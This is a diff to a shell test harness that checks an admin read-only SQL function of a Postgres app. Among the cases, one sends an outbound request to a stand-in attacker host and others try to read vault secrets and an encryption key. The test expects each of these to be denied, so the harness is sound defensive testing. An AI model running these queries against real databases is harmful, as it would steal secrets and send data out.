@@ -13,9 +13,10 @@ pg_ctl -D "$D/data" -o "-k $D -p 55439 -c listen_addresses=''" -l "$D/log" start
 P="psql -h $D -p 55439 -U harness -d postgres -v ON_ERROR_STOP=1 -q"
 HERE=$(cd "$(dirname "$0")" && pwd); ROOT="$HERE/../.."
 $P -f "$HERE/fixture.sql" >/dev/null
-for m in "$ROOT"/drizzle/migrations/0000_security_remediation_workflow_guards.sql "$ROOT"/drizzle/migrations/0001_audit_reader_restricted_role.sql; do
+for m in "$ROOT"/drizzle/migrations/000[0-9]_*.sql; do
   sed '/--> statement-breakpoint/d' "$m" | $P >/dev/null
 done
+[ -f "$HERE/pending-0002.sql" ] && $P -f "$HERE/pending-0002.sql" >/dev/null
 $P -f "$HERE/cases.sql" >/dev/null
 
 # 4. admin_run_readonly_sql: separate sessions so transaction mode is real.
@@ -36,7 +37,8 @@ A=00000000-0000-0000-0000-00000000000a; S=00000000-0000-0000-0000-000000000051
 ro "audit-sql: admin reads rota (read-only tx)" $A 1 "select count(*) from rota_assignments" allowed
 ro "audit-sql: admin reads profile names" $A 1 "select full_name from profiles" allowed
 ro "audit-sql: non-admin denied" $S 1 "select 1" denied
-ro "audit-sql: refused outside read-only tx" $A 0 "select 1" denied
+ro "audit-sql: works in read-write tx (wrapper forces read-only)" $A 0 "select count(*) from rota_assignments" allowed
+ro "audit-sql: net.http_post in read-write tx still blocked" $A 0 "select net.http_post('https://attacker.example')" denied
 ro "audit-sql: vault.decrypted_secrets" $A 1 "select * from vault.decrypted_secrets" denied
 ro "audit-sql: vault via CTE" $A 1 "with s as (select decrypted_secret from vault.decrypted_secrets) select * from s" denied
 ro "audit-sql: _enc_key()" $A 1 "select _enc_key()" denied
